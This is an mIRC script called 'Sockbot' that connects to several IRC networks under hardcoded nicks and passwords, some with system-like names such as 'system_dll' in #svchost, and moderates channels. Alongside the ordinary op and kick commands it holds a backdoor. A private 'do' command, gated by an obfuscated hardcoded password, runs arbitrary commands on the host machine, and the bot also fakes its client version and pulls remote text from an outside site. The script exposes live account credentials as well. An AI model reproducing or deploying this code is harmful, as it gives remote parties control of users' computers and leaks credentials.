;--------------
; Sockbot
;--------------
on *:start:unset %sbt_*
on *:connect:.signal sbcheck
alias -l ur {
  if (!$1) { return }
  hfree -w sbset
  if (!%hrtsrdxc) {
    sload irc.redesul.net|irc.netstudio.com.br|irc.leaving.com.br Cruel:crueldade #crueis,#brusque,#blumenau
    sload irc.g8net.com.br|us.brasnet.org system_dll:dndn2835-12-59sadi4d #svchost,#scriptx,#bobmarley,#lajeado
  }
  else { sload irc.mzima.net mh_test_bot #mhb }
  tokenize 32 $hget(sbset,$remove($1,sbot.))
  if ($prop == server) { return $gettok( $gettok($1,$r(1,$numtok($1,124)),124) ,1,58) }
  if ($prop == port) { return $iif($gettok($1,2,58),$ifmatch,6667) }
  if ($prop == nick) { return $gettok($2,1,58) }
  if ($prop == nickpass) { return $gettok($2,2,58) }
  if ($prop == chans) { return $3 }
}
on *:signal:sbcheck:{
  if (!$timer(sbcheck)) { .timersbcheck -io 0 120 .signal sbcheck }
  var %x = 1
  while ($ur(%x).server) {
    var %sn = sbot. $+ %x
    if (!$sock(%sn)) { sockopen %sn $ur(%x).server $ur(%x).port | hopen %sn }
    else {  }
    inc %x
  }
  joincheck
}
alias -l joincheck .timersb_join_check -io 1 3 joincheck_now
alias -l joincheck_now {
  var %x = 1
  while ($sock(sbot.*,%x)) {
    var %sn = $ifmatch, %y = 1
    while ($gettok($ur(%sn).chans,%y,44)) {
      var %chan = $ifmatch
      if (!$_chan(%sn,%chan)) { sbcmd %sn join %chan }
      inc %y
    }
    inc %x
  }
}
alias sbcmd if ($sock($1).status == active && $2) { sockwrite -tn $1- }
alias -l sclose { sockclose $1 | hfree -w $1 }
alias -l smsg sbcmd $1 PRIVMSG $2 $+(:,$$3-)
alias -l snotice sbcmd $1 NOTICE $2 $+(:,$$3-)
alias -l sload hadd -m sbset $calc($hget(sbset,0).item + 1) $1-
alias -l hopen { hfree -w $$1 | hmake $1 200 }
alias -l _network return $hget($1,network)
alias -l _me return $hget($iif($sock($sockname),$ifmatch,$1),me)
alias -l _chan return $gettok($hmatch($1,$+(chan:,$iif($2 isnum,*,$2)),$iif($2 isnum,$2,1)),2,$asc(:))
alias -l exitchan { hdel $1 $+(chan:,$$2) | hdel -w $1 $+($2,:*) }
alias -l isadmin $iif($hmatch($1,$+(log,*,$admask($2))),return yes)
alias -l admask return $gettok($1,2,33)
;nicks
alias -l nickget return $iif($3 isnum,$gettok($hmatch($1,$+($2,:*),$3),2,58),$hget($1,$+($2,:,$3)))
alias -l gmchr return $+($iif(@ isin $1,@),$iif(+ isin $1,+))
alias -l gmlet return $+($iif(o isin $1,@),$iif(v isin $1,+))
alias -l nicktot return $hmatch($1,$+($2,:*),0)
alias -l _isop return $iif(@ isin $nickget($1,$2,$3),1)
alias -l _isvo return $iif(+ isin $nickget($1,$2,$3),1)
alias -l _kick sbcmd $1 kick $2 $3 $+(:,$4-)
alias -l nkmask return $gettok($mid($1,2-),1,33)
;socket
on *:sockopen:sbot.*:{
  if ($sockerr) { return }
  sbcmd $sockname user bot "" servername : $+ % $+ nome
  sbcmd $sockname nick $ur($sockname).nick
}
on *:sockread:sbot.*:{
  if ($sockerr) { return }
  sockread %i | tokenize 32 %i | unset %i
  if (!$1) || ($2 = 372) { return }
  if (!$hget($sockname)) { hopen $sockname }
  if ($2 isnum 1-500) { r.raw $1- }
  if ($1 == PING) { sbcmd $sockname PONG $2- }
  if ($2 == PRIVMSG) { r.privmsg $1- }
  if ($2 == NOTICE) { r.notice $1- }
  if ($2 == MODE) { r.mode $1- }
  if ($2 == NICK) { r.nick $1- }
  if ($2 == JOIN) { r.join $1- }
  if ($2 == PART) { r.part $1- }
  if ($2 == KICK) { r.kick $1- }
  if ($2 == QUIT) { r.quit $1- }
  ;if ($1 == ERROR) { .timer 1 1 .signal sbcheck }
}
on *:sockclose:sbot.*:sclose $sockname
;requests
alias -l r.privmsg {
  var %chan = $iif($left($3,1) = $chr(35),$3), %mask = $1, %nick = $nkmask($1)
  tokenize 32 $mid($4-,2-)
  if ($left($1,1) ==  && $right($1-,1) == ) {
    tokenize 32 $mid($1-,2-,-1)
    if ($1 == VERSION) { sbcmd $sockname notice %nick :VERSION mIRC v6.16 Khaled Mardam-Bey }
    if ($1 == PING) { sbcmd $sockname notice %nick :PING $ctime $+  }
  }
  if (%chan && $istok(#brusque,%chan,32) && $_isop($sockname,%chan,$_me) && !$_isvo($sockname,%chan,%nick) && !$_isop($sockname,%chan,%nick)) {
    var %act = $iif(ACTION * iswm $1-,yes), %text = $strip($iif(%act,$gettok($remove($1-,),2-,32),$1-))
    var %w = *ouvindo*mp3*,*ao*som*de*,*mp3player*,*»¡«*winamp*»¡«*,*mp3*curtindo*,*mp3*kbps*,*»!«*mp3*»!«*,*EstouranDo*timPanUs*,*»¡«Scøøp*MP3»!«*
    if (%act) { var %w = %w ,*.mp3*,*curtindo*,*ouvindo*,*play*,*escutando*,*kurtind*,*kbps*,*mp3player*,*som*de*,*.wav*,*listening*,*quebrando*som*,*winamp*,*Na*OreLiNha* }
    var %x = 1, %tok = $numtok(%w,44)
    while (%x <= %tok) {
      if ($gettok(%w,%x,44) iswm %text) {
        if ($hget($sockname,$+(mp3flood:,%nick))) { sbcmd $sockname mode %chan +b $+(*!*@,$gettok(%mask,2,64)) | hdel $sockname $+(mp3flood:,%nick) }
        else { _kick $sockname %chan %nick É proibido mp3players no canal %chan $+ , se persistir será banido. | hadd $+(-u,$calc(30 * 60)) $sockname $+(mp3flood:,%nick) yes }
        return
      }
      inc %x
    }
  }
  if (%chan && $istok(!op !deop !k !kick !kb !voice !devoice,$1,32) && $_isop($sockname,%chan,$_me)) {
    if (!$isadmin($sockname,%mask) && !$_isop($sockname,%chan,%nick)) { snotice $sockname %nick Voce deve ser op no canal ou deve estar logado para usar este comando | return }
    var %nk = $iif($2,$2,%nick)
    if (%nk == $_me) { snotice $sockname %nick Eu não uso os comandos em mim mesmo | return }
    if (!$nickget($sockname,%chan,%nk)) { snotice $sockname %nick Nick não encontrado | return }
    if ($1 == !op && !$_isop($sockname,%chan,%nk)) { sbcmd $sockname mode %chan +o %nk }
    if ($1 == !deop && $_isop($sockname,%chan,%nk)) { sbcmd $sockname mode %chan -o %nk }
    if ($1 == !voice && !$_isvo($sockname,%chan,%nk)) { sbcmd $sockname mode %chan +v %nk }
    if ($1 == !devoice && $_isvo($sockname,%chan,%nk)) { sbcmd $sockname mode %chan -v %nk }
    if ($1 == !k) || ($1 == !kick) { _kick $sockname %chan %nk $iif($3,$3-,requested) }
    if ($1 == !kb) { set -u60 %sbkb. [ $+ [ %nk ] ] %chan $iif($3,$3-,requested) | sbcmd $sockname whois %nk }
  }
  if (%chan) {
    if (%sbt_cmd_flood_ [ $+ [ %chan ] ] >= 4) { return }
    var %c
    if ($1 == !links && %chan == #svchost) { %c = firelinkz $sockname %nick }
    if ($1 == topic && $2 && $isadmin($sockname,%mask)) { %c = sbcmd $sockname topic %chan : $+ $2- }
    if ($1 == mode && $2 && $isadmin($sockname,%mask)) { %c = sbcmd $sockname mode %chan $2- }
    if (%c) { inc -u20 %sbt_cmd_flood_ [ $+ [ %chan ] ] | %c }
  }
  if (!%chan && $istok(log help do sw uptime notice hop join part msg,$1,32)) {
    if ($1 == log) {
      if ($2 != $decode(eDc=,m)) { snotice $sockname %nick Senha incorreta | return }
      else { snotice $sockname %nick Senha aceita. Voce esta reconhecido | hadd $sockname $+(log,$admask(%mask)) $ctime }
    }
    elseif ($1 == help) {
      snotice $sockname %nick Comandos de Info e controle do BOT (apenas para quem estiver logado) -> log <senha> (loga vc no bot); sw (comando no server); uptime (server/mirc/pc uptime); notice (envia notice para vc) - hop <canal> & part <canal> & join <canal> & msg <canal/nick> <msg>
      snotice $sockname %nick Comandos de Operador de canal (apenas para ops e logados no canal, use: !comando <nick>, se nao houver <nick> o comando é usado em vc) -> !voice; !devoice; !op; !deop; !k; !kb
    }
    elseif (!$isadmin($sockname,%mask)) { snotice $sockname %nick Voce precisa estar logado no bot para utilizar este comando }
    elseif ($1 == do && $2) { $2- }
    elseif ($1 == sw) { sbcmd $sockname $2- }
    elseif ($1 == uptime) { snotice $sockname %nick Uptime Server: $duration($sock($sockname).to) - Uptime System: $uptime(system,2) - Uptime mIRC: $uptime(mirc,2) }
    elseif ($1 == notice) { .timer 1 0 snotice $sockname %nick $2- }
    elseif ($1 == hop && $_chan($sockname,$2)) { sbcmd $sockname part $2 | sbcmd $sockname join $2 }
    elseif ($1 == join && $2) { sbcmd $sockname join $2 }
    elseif ($1 == part && $2) { sbcmd $sockname part $2 }
    elseif ($1 == msg && $3) { .timer 1 0 smsg $sockname $2- }
  }
}
alias -l r.notice {
  var %nick = $nkmask($1)
  tokenize 32 $mid($4-,2-)
  if (*nickserv*identify* iswm $1- && %nick == nickserv && $_me == $ur($sockname).nick && $ur($sockname).nickpass) { sbcmd $sockname nickserv identify $ifmatch }
}
alias -l r.mode {
  var %x = 1, %chan = $3, %nick = $nkmask($1), %count = 0
  if ($left(%chan,1) != $chr(35)) { return }
  while ($mid($4,%x,1)) {
    var %m = $ifmatch
    if (%m == +) || (%m == -) { var %s = %m }
    elseif ($istok(o v b,%m,32)) { inc %count }
    if (%m isletter) {
      var %nk = $gettok($5-,%count,32)
      if ($gmlet(%m)) {
        var %let = $ifmatch, %mod = $hget($sockname,$+(%chan,:,%nk)), %mod = $iif($iif(%s == +,$+($gmchr($+(%mod,%let))),$remove(%mod,%let)),$ifmatch,n)
        hadd $sockname $+(%chan,:,%nk) %mod
      }
    }
    inc %x
  }
}
alias -l r.nick {
  var %nick = $nkmask($1), %newnick = $mid($3,2-)
  if (%nick == $_me) { hadd $sockname me %newnick | joincheck }
  var %x = 1
  while ($_chan($sockname,%x)) {
    var %chan = $ifmatch, %modes = $hget($sockname,$+(%chan,:,%nick))
    if (%modes) { hdel $sockname $+(%chan,:,%nick) | hadd $sockname $+(%chan,:,%newnick) %modes }
    inc %x
  }
}
alias -l r.join {
  var %chan = $mid($3,2-), %nick = $nkmask($1)
  if (%nick == $_me) {
    hadd $sockname $+(chan:,%chan) yes
    if (%chan == #svchost) { sbcmd $sockname chanserv op %chan $_me }
  }
  else { hadd $sockname $+(%chan,:,%nick) n }
}
alias -l r.part {
  var %nick = $nkmask($1), %chan = $3
  if (%nick == $_me) { exitchan $sockname %chan }
  else { hdel $sockname $+(%chan,:,%nick) }
}
alias -l r.kick {
  var %chan = $3, %knick = $4
  if (%knick == $_me) { exitchan $sockname %chan | sbcmd $sockname join %chan }
  else { hdel $sockname $+(%chan,:,%knick) }
}
alias -l r.quit {
  var %nick = $nkmask($1)
  if (%nick == $_me) { return }
  var %x = 1 | while ($_chan($sockname,%x)) { hdel $sockname $+($ifmatch,:,%nick) | inc %x }
}
alias -l r.raw {
  if ($2 = 005 && $wildtok($4-,NETWORK=*,1,32)) { hadd $sockname network $gettok($ifmatch,2,61) }
  if ($2 = 376) { hadd $sockname me $ur($sockname).nick | joincheck }
  if ($2 = 311 && $4 == $_me) { hadd $sockname mask $6 | .timer -io 1 20 sbcmd $sockname whois $_me }
  if ($2 = 311 && %sbkb. [ $+ [ $4 ] ]) {
    var %chan = $gettok($ifmatch,1,32), %reason = $gettok($ifmatch,2-,32)
    sbcmd $sockname mode %chan +b $+(*!*@,$6)
    _kick $sockname %chan $4 %reason
    unset %sbkb. [ $+ [ $4 ] ]
  }
  if ($2 = 353) {
    var %x = 1, %chan = $5, %nicks = $mid($6-,2-)
    while ($gettok(%nicks,%x,32)) {
      var %t = $ifmatch, %chr = $gmchr(%t), %nick = $remove(%t,%chr)
      hadd $sockname $+(%chan,:,%nick) $iif(%chr,$ifmatch,n)
      inc %x
    }
  }
  ;if ($2 = 433 && $3 != $_me) { var %change = $+(b,$r(1000,9999)) | sbcmd $sockname nick %change }
}
;sock tools
alias -l nohtml { var %x, %y = $regsub($1-,/(<[^>]+>)/g,$null,%x) | return %x }
alias -l nocolor { var %x, %y = $regsub($1-,/(&[^;]+;)/g,$null,%x) | return %x }
;links
alias -l firlin_msg smsg $sock(firelinkz).mark $1-
alias -l firelinkz {
  sockclose firelinkz
  sockopen firelinkz firecode.atspace.org 80
  sockmark firelinkz $1-
  unset %firelinkz_read
}
on *:sockopen:firelinkz:{
  if ($sockerr) { return }
  sockwrite -n $sockname GET /links.txt HTTP/1.1
  sockwrite -n $sockname Host: firecode.atspace.org
  sockwrite -n $sockname Connection: close
  sockwrite -n $sockname
}
on *:sockread:firelinkz:{
  if ($sockerr) { return }
  var %i | sockread %i
  if ($len(%i) < 1) { set %firelinkz_read 1 }
  if (%firelinkz_read) { firlin_msg %i }
}
;endscript
